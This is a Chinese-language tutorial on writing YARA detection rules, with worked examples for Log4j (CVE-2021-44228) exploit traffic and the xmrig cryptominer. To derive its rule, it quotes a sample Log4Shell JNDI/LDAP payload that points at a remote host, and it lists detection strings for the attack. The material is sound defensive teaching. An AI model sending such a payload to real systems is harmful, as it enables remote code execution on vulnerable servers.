## 写在前面

本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！

## 软件介绍

YARA 是一个旨在但不限于帮助恶意软件研究人员识别和分类恶意软件样本的工具。目前使用 YARA
的知名软件有赛门铁克、火眼、卡巴斯基、McAfee、VirusTotal 等。YARA工具可以基于文本或二进制模式创建恶意软件特征匹配。
每个规则由一组字符串和一个确定其逻辑的布尔表达式组成。

通常YARA规则包含三部分：

元部分：这部分包含未处理但帮助用户了解内容的一般或特定的信息。

字符串部分：这部分包含需要在文件中搜索的所有字符串。

条件部分：这部分定义匹配的条件。

![1653800866_6292ffa203dcece52e2df.png!small?1653800866542](https://image.3001.net/images/20220529/1653800866_6292ffa203dcece52e2df.png!small?1653800866542)

## 软件安装

Windows环境下可直接下载编译好的exe程序进行检测分析，当前使用的版本为4.2。

下载地址：<https://github.com/VirusTotal/yara>

![1653800883_6292ffb3e65461460e7e3.png!small?1653800884312](https://image.3001.net/images/20220529/1653800883_6292ffb3e65461460e7e3.png!small?1653800884312)

  

Mac环境下直接通过brew install yara安装（brew必须是官方安装的，不然会报错），当前使用的版本为4.2。

官方网站

<https://yara.readthedocs.io/>

![1653800904_6292ffc88d2b103aa7c94.png!small?1653800904647](https://image.3001.net/images/20220529/1653800904_6292ffc88d2b103aa7c94.png!small?1653800904647)

![1653800914_6292ffd258378ac3e8e82.png!small?1653800914577](https://image.3001.net/images/20220529/1653800914_6292ffd258378ac3e8e82.png!small?1653800914577)

## 常用语法

### 1.Yara规则语法

Yara规则内容支持十六进制、字符串、正则表达式进行匹配。

十六进制：定义变量 $A={十六进制内容}

字符串：定义变量$A="字符串"

正则表达式：定义变量$A=/正则表达式内容/

### 2.Yara规则条件

逻辑关系

or： 或

and：与

not： 非

all of them：所有条件匹配即告警

any of them：有一个条件匹配即告警

$a and $b and $c：abc同时匹配即告警

($a and $b) or $c：匹配a和b或c即告警

### 3.Yara规则常用修饰符关键字

nocase：不区分大小写

base64：base64字符串

xor：异或字符串

wide：宽字符

### 4.Yara规则例子

rule ExampleRule { meta: tag = "example" description = "这是一个例子" author =
"yunzui" strings $a = "jndi" nocase $b = "ladp" nocase condition: all of them
}

![1653800956_6292fffc38660e7edf858.png!small?1653800956392](https://image.3001.net/images/20220529/1653800956_6292fffc38660e7edf858.png!small?1653800956392)

## 实战检测运用

流量检测（log4j漏洞利用流量检测）

 **1.通过分析log4j漏洞利用原理及攻击常见payload**

${jndi:ldap://ip:9999/Exp}

 **2.提取检测特征**

![1653800966_62930006886c86d1ce62a.png!small?1653800966638](https://image.3001.net/images/20220529/1653800966_62930006886c86d1ce62a.png!small?1653800966638)

 **3.输出检测yara规则**

rule log4j

{

meta: description = "Log4j远程代码执行漏洞（CVE-2021-44228）

" author = "yunzui"

strings:

$a = "$"

$b = "jndi" nocase

$c = /(ldap|ldaps|rmi|dns|iiop)/ $d =
/[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(\\.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+\\.?|((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}/

condition:

all of them

}

![1653801004_6293002c5f5edff8d812f.png!small?1653801004575](https://image.3001.net/images/20220529/1653801004_6293002c5f5edff8d812f.png!small?1653801004575)

 **4.测试检测效果**

执行测试命令，正常检测攻击行为

yara rule.yara log4j.pcap

![1653801062_62930066db4a66e74a0c4.png!small?1653801063152](https://image.3001.net/images/20220529/1653801062_62930066db4a66e74a0c4.png!small?1653801063152)

### 应用程序检测（xmrig挖矿程序检测）

 **1.分析xmrig挖矿程序**

利用010 Editor等PE文件编辑工具进行特征的提取。该PE文件的文件头4D
5A、挖矿程序专用协议stratum、xmrig挖矿的程序的名称、矿池域名xx.pool.xx等特征进行关联匹配。

![1653801079_62930077f40774fab6eff.png!small?1653801080241](https://image.3001.net/images/20220529/1653801079_62930077f40774fab6eff.png!small?1653801080241)

![1653801093_62930085404a30b91a8c3.png!small?1653801094277](https://image.3001.net/images/20220529/1653801093_62930085404a30b91a8c3.png!small?1653801094277)

 **2.提取检测特征**

流量特征（DNS请求矿池地址pool.minexmr.com）。

![1653801103_6293008f4d91fe2ab17af.png!small?1653801103363](https://image.3001.net/images/20220529/1653801103_6293008f4d91fe2ab17af.png!small?1653801103363)

程序特征 PE文件头、挖矿专用协议等。

![1653801112_62930098d6ff69c3d3eaf.png!small?1653801113017](https://image.3001.net/images/20220529/1653801112_62930098d6ff69c3d3eaf.png!small?1653801113017)

 **3.输出yara检测规则**

rule xmrig

{

meta:

description = "xmrig挖矿程序"

author = "yunzui"

strings:

$hex = {4D 5A}

$a = "stratum" nocase

$c = "xmrig" nocase

$d = "pool" nocase

condition: all of them }

![1653801124_629300a43ce3ede7eb161.png!small?1653801124414](https://image.3001.net/images/20220529/1653801124_629300a43ce3ede7eb161.png!small?1653801124414)

 **4.测试检测效果**

执行测试命令，正常检测攻击行为（流量）。

yara rule.yara pool.pcap

![1653801168_629300d016cbf8ec53ac7.png!small?1653801168213](https://image.3001.net/images/20220529/1653801168_629300d016cbf8ec53ac7.png!small?1653801168213)

执行测试命令，利用-r参数对目录下的文件进行递归扫描，发现利用检测规则扫描出xmrig.exe挖矿程序。（程序）

yara rule.yara -r /Users/yunzui/Documents/yara

![1653801183_629300df97e18c416fce2.png!small?1653801183763](https://image.3001.net/images/20220529/1653801183_629300df97e18c416fce2.png!small?1653801183763)

## 总结思考

yara作为一款轻量的优秀检测工具，逻辑易理解且容易上手，对恶意软件分析人员和安全研究人员等提供了很大的帮助，当然在日常的应急响应中也应用广泛。

在APT（高级威胁狩猎）研究中，通常会涉及大量的样本分析，研究人员一般会通过使用yara编写轻量的检测规则在VirusTotal平进行威胁狩猎，捕获恶意样本进行分析，从追踪披露APT组织或活动变化。

![1653801219_629301034f9d493aff03e.png!small?1653801219502](https://image.3001.net/images/20220529/1653801219_629301034f9d493aff03e.png!small?1653801219502)

